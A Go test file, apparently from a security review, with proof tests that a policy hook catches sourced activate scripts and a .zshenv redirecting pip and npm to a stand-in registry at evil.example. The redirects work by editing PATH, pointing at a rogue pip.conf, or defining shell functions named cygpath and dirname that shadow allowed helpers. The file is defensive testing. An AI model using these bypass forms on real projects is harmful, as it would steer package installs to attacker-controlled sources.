//go:build unix

package main

// Independent re-review of b35419f (REPO-POL-NPMRC round 5, ADR-0174 round 10), 2026-11-15: proof tests. A failing
// case is a finding: a sourced script, using only forms the activate allow-list lets through, moves the program or
// the config the install reads, and an exception covers the hold.

import (
	"path/filepath"
	"strings"
	"testing"
)

// r5venv writes an activate script under cwd/v/bin and a venv elsewhere whose pip.conf names another index.
func r5venv(t *testing.T, cwd, body string) (evil string) {
	t.Helper()
	evil = t.TempDir()
	mkdir(t, filepath.Join(evil, "bin"))
	write(t, filepath.Join(evil, "pyvenv.cfg"), "home = /usr/bin\n")
	write(t, filepath.Join(evil, "pip.conf"), "[global]\nindex-url = https://evil.example/simple\n")
	mkdir(t, filepath.Join(evil, "etc"))
	write(t, filepath.Join(evil, "etc", "npmrc"), "registry=https://evil.example/\n")
	v := filepath.Join(cwd, "v")
	mkdir(t, filepath.Join(v, "bin"))
	write(t, filepath.Join(v, "pyvenv.cfg"), "home = /usr/bin\n")
	write(t, filepath.Join(v, "bin", "activate"), strings.ReplaceAll(body, "@EVIL@", evil))
	return evil
}

func TestR5ReviewActivateMovesTheProgram(t *testing.T) {
	for _, c := range []struct{ name, body, command string }{
		// T1: PATH set to another folder: pip (and python) come from there, and pip reads that prefix's pip.conf; the
		// reader reads the script's own venv and the hook's PATH
		{"PATH to another venv", "PATH=\"@EVIL@/bin:$PATH\"\nexport PATH\n", "pip install acme-tools"},
		// T2: uv's relocatable form with SCRIPT_PATH set by the script: VIRTUAL_ENV, and with the script's own PATH line
		// pip, are the other venv's
		{"relocatable with SCRIPT_PATH set", "SCRIPT_PATH=\"@EVIL@/bin/activate\"\n" +
			"VIRTUAL_ENV=''\"$(dirname -- \"$(dirname -- \"$(realpath -- \"$SCRIPT_PATH\")\")\")\"''\nexport VIRTUAL_ENV\n" +
			"PATH=\"$VIRTUAL_ENV/bin:$PATH\"\nexport PATH\n", "pip install acme-tools"},
		// T3: a function named like an allowed helper: the allowed substitution runs it
		{"cygpath as a function", "cygpath() { echo https://evil.example/; }\n" +
			"export npm_config_registry=$(cygpath https://registry.npmjs.org/)\n", "npm i @acme/cli"},
		{"dirname as a function", "dirname() { echo @EVIL@; }\n" +
			"VIRTUAL_ENV=''\"$(dirname -- \"$(dirname -- \"$(realpath -- \"$SCRIPT_PATH\")\")\")\"''\nexport VIRTUAL_ENV\n" +
			"PATH=\"$VIRTUAL_ENV/bin:$PATH\"\nexport PATH\n", "pip install acme-tools"},
	} {
		_, _, cwd := npmWorkspace(t)
		r5venv(t, cwd, c.body)
		command := ". v/bin/activate && " + c.command
		exceptionPath(t, command)
		if form, stderr := round7(t, cwd, command, nil); form == "silent" {
			t.Errorf("%s: an exception covers it (stderr %q)", c.name, stderr)
		}
	}
}

func TestR5ReviewCygpathFunctionInStartupFile(t *testing.T) {
	// T3 in a startup file: literal() unwraps $(cygpath …) everywhere, so a function named cygpath decides the value
	_, _, cwd := npmWorkspace(t)
	home := t.TempDir()
	write(t, filepath.Join(home, ".zshenv"), "cygpath() { echo https://evil.example/; }\nexport npm_config_registry=$(cygpath https://registry.npmjs.org/)\n")
	if form, stderr := round7(t, cwd, "npm i @acme/cli", npmrcFiles(t, "", home, nil, nil)); form == "silent" {
		t.Errorf("a cygpath function in .zshenv: an exception covers it (stderr %q)", stderr)
	}
}
